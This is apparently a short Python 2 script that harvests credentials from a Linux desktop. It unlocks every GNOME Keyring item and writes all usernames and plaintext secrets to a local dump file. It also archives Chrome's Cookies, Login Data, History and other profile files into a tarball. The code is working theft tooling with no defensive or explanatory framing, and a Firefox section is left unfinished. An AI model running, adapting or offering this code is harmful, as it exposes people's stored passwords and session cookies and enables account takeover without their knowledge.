from colorama import init, Fore, Back
import tarfile
import os, sys
import secretstorage

init(autoreset=True)

def read_secret_storage():
    bus = secretstorage.dbus_init()
    data = []
    for keyring in secretstorage.get_all_collections(bus):
        for item in keyring.get_all_items():
            if item.is_locked():
                item.unlock()
            attr = item.get_attributes()
            if attr and 'username_value' in attr:
                data.append((
                    keyring.get_label(),
                    item.get_label()+": "+attr['username_value'],
                    item.get_secret().decode("utf-8")
                ))
            else:
                data.append((
                    keyring.get_label(),
                    item.get_label(),
                    item.get_secret().decode("utf-8")
                ))
    return data

####### GNOME Keyring Dump

gnkeyring = read_secret_storage()
print Fore.BLUE+"[+] GNOME Keyring Passwords: "+ str(len(gnkeyring))+" entries"
for i in range(0,2):
    print Fore.WHITE+" ".join(gnkeyring[i])
print Fore.YELLOW+"..."
sys.stdout.flush()
f = open("gnome_keyring_dump","w")
f.write("\n".join(map(lambda x: "[{0[0]}] {0[1]}: {0[2]}".format(x),gnkeyring)))
f.close()
print Fore.WHITE+"Wrote all to",Fore.YELLOW+"gnome_keyring_dump"


############ Google-Chrome Util Files
### Chromium should work the same way, just the path maybe change

binfinal = "google_chrome_files.tar.gz"
base_path = os.path.join(os.path.expanduser("~"),".config","google-chrome","Default");
files = ["Bookmarks", "Cookies", "History", "Login Data", "Top Sites"]
print Fore.BLUE+"[+] Google Chrome Files ",Fore.YELLOW+",".join(files)+"...",
sys.stdout.flush();
tar = tarfile.open(binfinal, "w:gz")
for name in files:
    tar.add(os.path.join(base_path,name))
tar.close()
print Fore.BLUE+"Added to",Fore.WHITE+binfinal

#######

########### Firefox
##bah... maybe later
